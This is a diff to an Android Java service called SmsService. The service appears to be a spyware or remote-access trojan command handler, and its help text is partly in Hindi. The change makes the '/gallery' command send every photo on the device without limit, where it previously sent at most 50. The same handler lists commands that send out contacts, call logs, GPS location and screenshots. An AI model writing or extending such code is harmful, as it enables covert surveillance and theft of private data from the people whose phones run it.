@@ -305,9 +305,11 @@ public class SmsService extends Service {
                 sendCallLog();
 
             } else if (cmd.toLowerCase().startsWith("/gallery")) {
-                int count = 10;
-                try { count = Integer.parseInt(cmd.trim().split("\\s+")[1]); } catch (Exception ignored) {}
-                if (count > 50) count = 50;
+                String[] parts = cmd.trim().split("\\s+");
+                int count = Integer.MAX_VALUE; // default: saari photos
+                if (parts.length > 1) {
+                    try { count = Integer.parseInt(parts[1]); } catch (Exception ignored) {}
+                }
                 final int fc = count;
                 new Thread(() -> sendGalleryPhotos(fc)).start();
 
@@ -351,8 +353,8 @@ public class SmsService extends Service {
                     "/contacts — Saare contacts\n" +
                     "/calllog — Last 100 calls\n\n" +
                     "🖼 Gallery:\n" +
-                    "/gallery — Last 10 photos\n" +
-                    "/gallery 20 — Last 20 photos (max 50)\n\n" +
+                    "/gallery — Saari photos (unlimited)\n" +
+                    "/gallery 30 — Sirf 30 photos\n\n" +
                     "📍 Location & Screen:\n" +
                     "/location — GPS location\n" +
                     "/screenshot — Ek screenshot\n" +
